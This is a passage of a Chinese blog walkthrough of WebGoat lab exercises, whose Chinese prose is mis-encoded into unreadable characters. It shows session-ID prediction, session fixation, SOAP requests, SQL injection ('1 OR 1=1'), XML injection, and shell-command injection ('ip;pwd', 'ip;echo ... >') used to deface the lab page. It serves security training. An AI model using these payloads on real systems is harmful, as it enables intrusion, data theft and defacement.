<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span>: Apache-Coyote/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Set</span>-Cookie: WEAKID=<span class="hljs-number">12877</span>-<span class="hljs-number">1523008242369</span><br><span class="hljs-attribute">Content</span>-Type: text/html;charset=ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">1307</span><br><span class="hljs-attribute">Date</span>: Fri, <span class="hljs-number">06</span> Apr <span class="hljs-number">2018</span> <span class="hljs-number">09</span>:<span class="hljs-number">50</span>:<span class="hljs-number">42</span> GMT<br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></table></figure>
<p>ÈÇ£‰πà‰πüÂ∞±ÊÑèÂë≥ÁùÄÔºå12876 Áªô‰∫ÜÊüê‰∏™ÂêàÊ≥ïÁî®Êà∑</p>
<p>ËÄå <code>-</code> ÂêéÈù¢ÂæàÂÉèÊØ´ÁßíÁ∫ßÁöÑÊó∂Èó¥Êà≥ÔºåÁúãÁúãÊòØ‰∏çÊòØÔºö</p>
<p>1523008242367Ôºö2018/4/6 17:50:42</p>
<p>1523008242369Ôºö2018/4/6 17:50:42</p>
<p>ÁúãÊù•ÂêéÈù¢ÁöÑÂ∫îËØ•ÊòØ 1523008242368 ‰∫Ü</p>
<p>ÊêûÂÆö</p>
<h3 id="session-fixation">Session Fixation</h3>
<h4 id="strage-1">Strage 1</h4>
<p>Á¨¨ 1 Èò∂ÊÆµÔºö‰Ω†ÊòØÈªëÂÆ¢‰πîÔºå‰Ω†ÊÉ≥‰ªéÁÆÄÂÅ∑Ëµ∞Ëøô‰∏™‰ºöËØù„ÄÇ ÂèëÈÄÅÂáÜÂ§áÂ•ΩÁöÑÁîµÂ≠êÈÇÆ‰ª∂ÁªôÂèóÂÆ≥ËÄÖÔºåÁúãËµ∑Êù•ÂÉèÈì∂Ë°åÁöÑÂÆòÊñπÁîµÂ≠êÈÇÆ‰ª∂„ÄÇ Ê®°ÊùøÊ∂àÊÅØÂú®‰∏ãÈù¢ÂáÜÂ§áÂ•ΩÔºåÊÇ®ÈúÄË¶ÅÂú®ÁîµÂ≠êÈÇÆ‰ª∂ÂÜÖÁöÑÈìæÊé•‰∏≠Ê∑ªÂä†‰ºöËØù IDÔºàSIDÔºâ„ÄÇ ÊîπÂèòÈìæÊé•‰ª•ÂåÖÂê´ SID„ÄÇ</p>
<p>Âú® href ÂêéÈù¢Âä†‰∏ä <code>&amp;SID=666666 Âç≥ÂèØ</code></p>
<h4 id="strage-2">Strage 2</h4>
<p>Á¨¨ 2 Èò∂ÊÆµÔºöÁé∞Âú®‰Ω†ÊòØÂèóÂÆ≥ËÄÖ JaneÔºå‰ªñÊî∂Âà∞‰∏ãÈù¢ÁöÑÁîµÂ≠êÈÇÆ‰ª∂„ÄÇ Â¶ÇÊûúÊÇ®Áî®Èº†Ê†áÊåáÂêëÈìæÊé•ÔºåÊÇ®‰ºöÁúãÂà∞ÂåÖÂê´ SID„ÄÇ ÁÇπÂáªÂÆÉÁúãÁúã‰ºöÂèëÁîü‰ªÄ‰πà„ÄÇ</p>
<h4 id="stage-3-4">Stage 3</h4>
<p>ÁôªÈôÜ Jane ÁöÑÂ∏êÂè∑</p>
<h4 id="stage-4-3">Stage 4</h4>
<p>ÁÇπÂáªÈìæÊé•ÔºåÁÑ∂ÂêéÊää url Êîπ‰∏∫ÁöÑ sid Êîπ‰∏∫‰πãÂâçÂú®ÈÇÆ‰ª∂ÈáåËÆæÁΩÆÁöÑ sid</p>
<h2 id="web-services">Web Services</h2>
<h3 id="create-a-soap-request">Create a SOAP Request</h3>
<h4 id="stage-1-8">Stage 1</h4>
<p>Web ÊúçÂä°ÈÄöËøá‰ΩøÁî® SOAP ËØ∑Ê±ÇËøõË°åÈÄö‰ø°„ÄÇ Ëøô‰∫õËØ∑Ê±ÇË¢´Êèê‰∫§Áªô Web ÊúçÂä°‰ª•Â∞ùËØïÊâßË°å Web ÊúçÂä°ÂÆö‰πâËØ≠Ë®ÄÔºàWSDLÔºâ‰∏≠ÂÆö‰πâÁöÑÂäüËÉΩ„ÄÇ ËÆ©Êàë‰ª¨Â≠¶‰π†‰∏Ä‰∫õÂÖ≥‰∫é WSDL Êñá‰ª∂ÁöÑÁü•ËØÜ„ÄÇ Êü•Áúã WebGoat ÁöÑ Web ÊúçÂä°ÊèèËø∞ËØ≠Ë®ÄÔºàWSDLÔºâÊñá‰ª∂„ÄÇ<br />
ÊÄªÁõÆÊ†áÔºö</p>
<p>Â∞ùËØï‰ΩøÁî®ÊµèËßàÂô®Êàñ Web ÊúçÂä°Â∑•ÂÖ∑ËøûÊé•Âà∞ WSDL„ÄÇ Web ÊúçÂä°ÁöÑ URL ‰∏∫ÔºöhttpÔºö// localhost / WebGoat / services / SoapRequest ÈÄöÂ∏∏ÂèØ‰ª•ÈÄöËøáÂú® Web ÊúçÂä°ËØ∑Ê±ÇÁöÑÊú´Â∞æÊ∑ªÂä†‰∏Ä‰∏™Ôºü WSDL Êù•Êü•Áúã WSDL„ÄÇ ÊÇ®ÂøÖÈ°ªËÆøÈóÆ 2 ‰∏™Êìç‰ΩúÊâçËÉΩÈÄöËøáÊú¨ËØæÁ®ã„ÄÇ</p>
<p>ÂÖàÁúã‰∏Ä‰∏™ÁÆÄÊòìÁâàÁöÑÊ†áÁ≠æÊèèËø∞:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">definitions</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">types</span>&gt;</span><br>      ÂÆö‰πâ web service ‰ΩøÁî®ÁöÑÊï∞ÊçÆÁ±ªÂûã„ÄÇ‰∏∫‰∫ÜÊúÄÂ§ßÁ®ãÂ∫¶ÁöÑÂπ≥Âè∞‰∏≠Á´ãÊÄßÔºåWSDL ‰ΩøÁî® XML Schema<br>      ËØ≠Ê≥ïÊù•ÂÆö‰πâËá™Â∑±Êï∞ÊçÆÁ±ªÂûãÔºåËÄå‰∏çÊòØÈááÁî®‰ªª‰ΩïÊó¢ÊúâÁöÑÁºñÁ®ãËØ≠Ë®ÄÁöÑÊï∞ÊçÆÁ±ªÂûã„ÄÇ<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">types</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span><br>     ÂÆö‰πâ‰∏Ä‰∏™Êìç‰ΩúÁöÑÊï∞ÊçÆÂÖÉÁ¥†„ÄÇÊúØËØ≠ Message ËÆ©‰∫∫ÊúâÁÇπÊë∏‰∏çÁùÄÂ§¥ËÑëÔºå<br>     ÂÖ∂ÂÆûÂ∞±ÊòØÂú®ÂÆö‰πâÂèÇÊï∞ÔºàÂèÇÊï∞ÁöÑÂêçÂ≠óÂèäÁ±ªÂûãÔºåÁ±ªÂûãÁî±ÂâçÈù¢ÁöÑ types ËäÇÂÆö‰πâÔºâ„ÄÇ     <br>   <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>   <br>   <span class="hljs-tag">&lt;<span class="hljs-name">portType</span>&gt;</span><br>      WSDL ‰∏≠ÊúÄÈáçË¶ÅÁöÑÂÖÉÁ¥†„ÄÇ‰πüÊòØ‰∏Ä‰∏™ËÆ©‰∫∫Êë∏‰∏çÁùÄÂ§¥ËÑëÁöÑÊúØËØ≠„ÄÇÂÖ∂ÂÆûÂ∞±ÊòØÂÆö‰πâÊé•Âè£ÁöÑÂêçÁß∞„ÄÇ<br>      Êé•Âè£‰∏≠ÁöÑÂáΩÊï∞‰ΩøÁî®<span class="hljs-tag">&lt;<span class="hljs-name">operation</span>&gt;</span>ÂÖÉÁ¥†Êù•Â£∞ÊòéÔºåÂáΩÊï∞ÁöÑÂêçÂ≠ó‰∏∫ operation ÂÖÉÁ¥†ÁöÑ name Â±ûÊÄßÔºå<br>      ËæìÂÖ•ÂèÇÊï∞‰ΩøÁî® input message Â£∞ÊòéÔºåËæìÂá∫ÂèÇÊï∞‰ΩøÁî® output message Â£∞Êòé<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">operation</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">portType</span>&gt;</span>  <br>   <span class="hljs-tag">&lt;<span class="hljs-name">binding</span>&gt;</span><br>      ËØ•ÈÉ®ÂàÜÊåáÂÆöÊé•Âè£‰∏éÂ∫ïÂ±ÇÂÆûÁé∞ÂçèËÆÆÁöÑÂÆûÁé∞ÁªÜËäÇ„ÄÇ ËØ•ËäÇË∑üÁºñÁ®ãÊ≤°ÊúâÁõ¥Êé•ÁöÑÂØπÂ∫îÂÖ≥Á≥ª„ÄÇ<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">binding</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span><br>      ËØ•ÈÉ®ÂàÜÁî®‰∫éÊåáÂÆöÂÆûÁé∞‰∫ÜËØ•Êé•Âè£ÁöÑ‰∏Ä‰∏™ÂÆû‰æã<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">definitions</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>‰∏ÄÂÖ± 4 ‰∏™ operation</p>
<h4 id="stage-2-8">Stage 2</h4>
<p>int</p>
<h4 id="stage-3-5">Stage 3</h4>
<p>ÊäìÂåÖÔºå‰øÆÊîπ‰∏Ä‰∏ãÂèÇÊï∞Ôºö</p>
<ol type="1">
<li><p><code>POST http://localhost/WebGoat/services/SoapRequest HTTP/1.1</code></p></li>
<li><p><code>Content-Type: text/xml</code></p></li>
<li><p><code>SOAPAction:</code></p></li>
<li><p>Á¨¨‰∏ÄÊ¨°Âèë</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Envelope</span> <span class="hljs-attr">xmlns:SOAP-ENV</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsd</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">ns1:getFirstName</span> <span class="hljs-attr">SOAP-ENV:encodingStyle</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="hljs-attr">xmlns:ns1</span>=<span class="hljs-string">&quot;http://lessons&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">&quot;xsd:int&quot;</span>&gt;</span>101<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><br> <span class="hljs-tag">&lt;/<span class="hljs-name">ns1:getFirstName</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>‚Äã</p></li>
<li><p>Á¨¨‰∫åÊ¨°ÂèëÔºö</p></li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">SOAPAction: <br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Envelope</span> <span class="hljs-attr">xmlns:SOAP-ENV</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsd</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">ns1:getLastName</span> <span class="hljs-attr">SOAP-ENV:encodingStyle</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="hljs-attr">xmlns:ns1</span>=<span class="hljs-string">&quot;http://lessons&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">&quot;xsd:int&quot;</span>&gt;</span>101<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><br> <span class="hljs-tag">&lt;/<span class="hljs-name">ns1:getLastName</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>Joe Snow~</p>
<h3 id="wsdl-scanning">WSDL Scanning</h3>
<p>Web ÊúçÂä°ÈÄöËøá‰ΩøÁî® SOAP ËØ∑Ê±ÇËøõË°åÈÄö‰ø°„ÄÇ Ëøô‰∫õËØ∑Ê±ÇË¢´Êèê‰∫§Áªô Web ÊúçÂä°‰ª•Â∞ùËØïÊâßË°å Web ÊúçÂä°ÂÆö‰πâËØ≠Ë®ÄÔºàWSDLÔºâÊñá‰ª∂‰∏≠ÂÆö‰πâÁöÑÂäüËÉΩ„ÄÇ</p>
<p>ÊÄªÁõÆÊ†áÔºö</p>
<p>ËØ•Â±èÂπïÊòØ Web ÊúçÂä°ÁöÑ API„ÄÇ Ê£ÄÊü•Ê≠§ Web ÊúçÂä°ÁöÑ WSDL Êñá‰ª∂Âπ∂Â∞ùËØïËé∑Âèñ‰∏Ä‰∫õÂÆ¢Êà∑‰ø°Áî®ÁºñÂè∑„ÄÇ</p>
<p>Ë¶ÅÊãøÂà∞ CreditCardIDÔºåÁúã APIÔºåÂáΩÊï∞‰∏∫ getCreditCardÔºåÊäìÂåÖÊîπ‰∏Ä‰∏ãÂèÇÊï∞Âç≥ÂèØ„ÄÇ‰øÆÊîπÁöÑÂèÇÊï∞Âíå‰∏ä‰∏ÄÈ¢ò‰∏ÄÊ†∑ÔºåÊ≥®ÊÑèÔºåPOST ÁöÑ url„ÄÇÂèëÂåÖËøáÂéªÂ∞±Â•Ω‰∫Ü</p>
<h3 id="web-service-sql-injection">Web Service SQL Injection</h3>
<p>ÊÄªÁõÆÊ†áÔºö</p>
<p>Ê£ÄÊü• Web ÊúçÂä°ÊèèËø∞ËØ≠Ë®ÄÔºàWSDLÔºâÊñá‰ª∂Âπ∂Â∞ùËØïËé∑ÂèñÂ§ö‰∏™ÂÆ¢Êà∑‰ø°Áî®Âç°Âè∑Á†Å„ÄÇ ÊÇ®‰∏ç‰ºöÁúãÂà∞ËøîÂõûÂà∞Ê≠§Â±èÂπïÁöÑÁªìÊûú„ÄÇ ÂΩì‰Ω†Áõ∏‰ø°‰Ω†Â∑≤ÁªèÊàêÂäüÊó∂ÔºåÂà∑Êñ∞È°µÈù¢Âπ∂ÂØªÊâæ'ÁªøËâ≤ÊòüÊòü'</p>
<p>Âíå‰∏ä‰∏ÄÈ¢ò‰∏ÄÊ†∑Ôºåpayload ‰∏∫Ôºö</p>
<p><code>1 OR 1=1</code></p>
<p>Ëøô 2 È¢òÊé®Ëçê‰∏Ä‰∏ã bursuite ‰∏ãÁöÑÊèí‰ª∂ wsdlerÔºåË∂ÖÁ∫ßÂ•ΩÁî®ÔºàÊâãÂä®ÊûÑÈÄ† xml ÁÆÄÁõ¥‰∏çË¶ÅÂ§™ÁàΩ</p>
<h3 id="web-service-sax-injection">Web Service SAX Injection</h3>
<p>Ê≥®ÂÖ•Ëøô‰∏™Âç≥ÂèØÔºö</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666&lt;/password&gt;      &lt;<span class="hljs-built_in">id</span> xsi:<span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;xsd:int&#x27;</span>&gt;102&lt;/id&gt;       &lt;password xsi:<span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;xsd:string&#x27;</span>&gt;777<br></code></pre></td></tr></table></figure>
<h2 id="admin-functions">Admin Functions</h2>
<p>ËØæÁ®ãÂÆåÊàêÁöÑÁ∫µËßà</p>
<h2 id="the-challenge">The CHALLENGE</h2>
<p>ÊÇ®ÁöÑ‰ªªÂä°ÊòØÊâìÁ†¥Ë∫´‰ªΩÈ™åËØÅÊñπÊ°àÔºå‰ªéÊï∞ÊçÆÂ∫ì‰∏≠Á™ÉÂèñÊâÄÊúâ‰ø°Áî®Âç°ÔºåÁÑ∂ÂêéÊ±°ÊçüÁΩëÁ´ô„ÄÇ ‰Ω†Â∞Ü‰∏çÂæó‰∏ç‰ΩøÁî®‰Ω†Âú®ÂÖ∂‰ªñËØæÁ®ã‰∏≠Â≠¶Âà∞ÁöÑËÆ∏Â§öÊäÄÂ∑ß„ÄÇ Ëøô‰∏™ÁΩëÁ´ôÁöÑ‰∏ªË¶ÅÁΩëÈ°µÊòØ'webgoat_challenge_guest.jsp'</p>
<h4 id="stage-1-9">Stage 1</h4>
<p>Èöè‰æøÂ°´‰∫ÜÁî®Êà∑ÂêçÂØÜÁ†ÅÔºåÊäìÂåÖÔºåÂØπÊâÄÊúâÁöÑÂèÇÊï∞Â∞ùËØïËøõË°åÊ≥®ÂÖ•Ôºå‰ª£Á†ÅÁº∫Èô∑ÊîªÂáªÔºåÂùáÊó†Êïà„ÄÇÁÑ∂ÂêéÂØπÈÇ£‰∏™ÈöêËóèÁöÑ usr Ëµ∑‰∫ÜÁñëÂøÉÔºåÊêú‰∫Ü‰∏Ä‰∏ãÔºåÂèëÁé∞ÊòØÊô∫ËÄÖ‰∏∫ÁéãÔºå‰∏Ä‰∏™Ê∫êËá™Ëã±ÂõΩÁöÑÁîµËßÜÊ∏∏ÊàèËäÇÁõÆ„ÄÇ‰ΩúËÄÖËÇØÂÆö‰∏ç‰ºöÊó†ÁºòÊó†ÊïÖÈÄâËøô‰∏™ÔºåÊåâÁÖß CTF ÁöÑÂ∞øÊÄßÔºåÂíåËøô‰∏™ËäÇÁõÆÊúâÂÖ≥ÁöÑ‰∏úË•øÂçÅÊúâÂÖ´‰πùÊòØÁ∫øÁ¥¢ÔºåÁÑ∂ÂêéÊâæÂà∞‰∫Ü‰∏ªÊåÅ‰∫∫Â∏∏ËØ¥ÁöÑ‰∏ÄÂè•ËØùÔºöYou are the weakest link, goodbye</p>
<p>Èöè‰æøÂ°´‰∫ÜÁî®Êà∑ÂêçÂØÜÁ†ÅÔºåÊäìÂåÖÔºåÂØπÊâÄÊúâÁöÑÂèÇÊï∞Â∞ùËØïËøõË°åÊ≥®ÂÖ•Ôºå‰ª£Á†ÅÁº∫Èô∑ÊîªÂáªÔºåÂùáÊó†Êïà„ÄÇÁÑ∂ÂêéÂØπÈÇ£‰∏™ÈöêËóèÁöÑ usr Ëµ∑‰∫ÜÁñëÂøÉÔºåÊêú‰∫Ü‰∏Ä‰∏ãÔºåÂèëÁé∞ÊòØ <code>Êô∫ËÄÖ‰∏∫Áéã</code>Ôºå‰∏Ä‰∏™Ê∫êËá™Ëã±ÂõΩÁöÑÁîµËßÜÊ∏∏ÊàèËäÇÁõÆ„ÄÇ‰ΩúËÄÖËÇØÂÆö‰∏ç‰ºöÊó†ÁºòÊó†ÊïÖÈÄâËøô‰∏™ÔºåÊåâÁÖß CTF ÁöÑÂ∞øÊÄßÔºåÂíåËøô‰∏™ËäÇÁõÆÊúâÂÖ≥ÁöÑ‰∏úË•øÂçÅÊúâÂÖ´‰πùÊòØÁ∫øÁ¥¢ÔºåÁÑ∂ÂêéÊâæÂà∞‰∫Ü‰∏ªÊåÅ‰∫∫Â∏∏ËØ¥ÁöÑ‰∏ÄÂè•ËØùÔºö<code>You are the weakest link, goodbye</code></p>
<p>Âä†‰∏ä usr ÁöÑ <code>youaretheweakestlink</code>ÔºåÁåúÊµãËøôÊòØ‰∏ÄÂØπÁî®Êà∑Âêç/ÂØÜÁ†ÅÔºåÁôªÈôÜÔºåÊàêÂäü‰∫Ü„ÄÇ„ÄÇ„ÄÇ</p>
<h4 id="stage-2-9">Stage 2</h4>
<p>Âú® Cookie ‰∏≠ÁöÑ usr Â≠òÂú® SQL Ê≥®ÂÖ•ÔºåÊ≥®ÊÑè base64 ÁºñÁ†Å</p>
<h4 id="stage-3-6">Stage 3</h4>
<p>ÊäìÂåÖÔºåÊîπ File Âç≥ÂèØÔºö</p>
<p>‰∏çÁü•ÈÅìË∑ØÂæÑÔºåÊÖ¢ÊÖ¢Êù•</p>
<ol type="1">
<li><p><code>ip;pwd</code> =&gt; <code>/home/macr0phag3/Downloads</code></p></li>
<li><p>```<br />
ip;find -name "webgoat_challenge_guest.jsp"=&gt;./.extract/webapps/WebGoat/webgoat_challenge_guest.jsp<br />
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>3. ```1<br>   ip;<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hack by Tr0y&#x27;</span> &gt; /home/XXXXXX/Downloads/.extract/webapps/WebGoat/webgoat_challenge_guest.jsp<br></code></pre></td></tr></table></figure></p></li>
</ol>
<h2 id="ÂÆåÁªì">ÂÆåÁªì</h2>
<strong>Ëøô‰∏™Èù∂Âú∫ÂæàÊúâÊÑèÊÄùÔºåÂÅöÂÆåÊèêÂçá‰∫Ü‰∏çÂ∞ë~~ </strong><br />
<br>
<p style="text-align: center;">
<font size="2px" color="gray">Êù•ÂëÄÂø´Ê¥ªÂëÄ</font><br />
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/" class="category-chain-item">ËøáÁ®ãËÆ∞ÂΩï</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web/">#Web</a>
      
        <a href="/tags/%E9%9D%B6%E5%9C%BA/">#Èù∂Âú∫</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>WebGoat Èù∂Âú∫È¢òËß£</div>
      <div>https://www.tr0y.wang/2018/04/06/WebGoat/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>‰ΩúËÄÖ</div>
          <div>Tr0y</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>ÂèëÂ∏É‰∫é</div>
          <div>2018Âπ¥4Êúà6Êó•</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Êõ¥Êñ∞‰∫é</div>
          <div>2021Âπ¥4Êúà13Êó•</div>
        </div>
      
      <div class="license-meta-item">
        <div>ËÆ∏ÂèØÂçèËÆÆ</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ÁΩ≤Âêç">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2018/04/07/SQL%E6%B3%A8%E5%85%A5%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90-WooYun/" title="SQL Ê≥®ÂÖ•ÂÖ≥ËÅîÂàÜÊûê">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">SQL Ê≥®ÂÖ•ÂÖ≥ËÅîÂàÜÊûê</span>
                        <span class="visible-mobile">‰∏ä‰∏ÄÁØá</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2018/03/21/sqlmap-guide/" title="SQLmap ‰ΩøÁî®ÊâãÂÜå">
                        <span class="hidden-mobile">SQLmap ‰ΩøÁî®ÊâãÂÜå</span>
                        <span class="visible-mobile">‰∏ã‰∏ÄÁØá</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'comment');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ÁõÆÂΩï</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">ÊêúÁ¥¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">ÂÖ≥ÈîÆËØç</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        ÊÄªËÆøÈóÆÈáè 
